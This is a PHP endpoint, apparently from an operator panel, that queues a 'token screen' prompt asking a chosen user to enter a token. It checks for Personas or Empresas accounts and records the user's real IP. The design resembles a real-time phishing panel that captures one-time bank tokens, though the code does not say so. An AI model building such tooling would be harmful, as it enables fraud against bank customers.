<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/../php_config/tela_modales_helpers.php';
verificarAuth();

define('TOKEN_EMPRESA_PREFIX', '[[TOKEN_EMPRESA]]');

$pdo = conectarBD();
$input = leerJSON();

$usuario_id = intval($input['usuario_id'] ?? 0);
$admin_id = intval($_SESSION['admin_id'] ?? 0);
$ip_usuario = $input['ip_usuario'] ?? 'panel';

if (!$usuario_id) {
    jsonError('ID de usuario no válido');
}

try {
    $stmtUser = $pdo->prepare('SELECT id, apellido, ip_real FROM usuarios WHERE id = ?');
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        jsonError('Usuario no encontrado', 404);
    }

    if (!tokenPantallaUsaControl($usuario)) {
        jsonError('La tela de token solo aplica para usuarios Personas o Empresas');
    }

    $ip_real = $usuario['ip_real'] ?: $ip_usuario;

    cancelarTelasModalesPendientes($pdo, $usuario_id);

    $mensaje = TOKEN_EMPRESA_PREFIX . 'Token ENVIADO';

    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado)
        VALUES (?, ?, ?, 'con_input', ?, 'pendiente')
    ");

    if ($stmt->execute([$usuario_id, $admin_id, $mensaje, $ip_real])) {
        jsonResponse([
            'success' => true,
            'message' => 'Tela de token enviada correctamente',
            'mensaje_id' => (int) $pdo->lastInsertId(),
        ]);
    }

    jsonError('Error al enviar la tela de token', 500);
} catch (Exception $e) {
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
